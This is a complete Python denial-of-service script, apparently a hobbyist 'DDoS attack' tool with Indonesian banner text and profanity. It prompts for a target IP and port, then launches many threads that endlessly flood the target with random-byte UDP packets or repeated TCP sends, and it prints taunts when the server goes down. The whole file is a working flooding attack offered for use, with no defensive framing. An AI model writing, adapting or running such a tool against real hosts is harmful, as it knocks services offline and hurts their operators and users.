#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by 𝙂𝙯𝙖𝙖𝙭𝙮𝙯")
print("Jangan abuse asw ")
ip = str(input(" DdosAttackByExcrusher | Ip:"))
port = int(input(" DdosAttackByExcrusher | Port:"))
choice = str(input(" DdosAttackByExcrusher | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByExcrusher | Packets:"))
threads = int(input(" DdosAttackByExcrusher | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()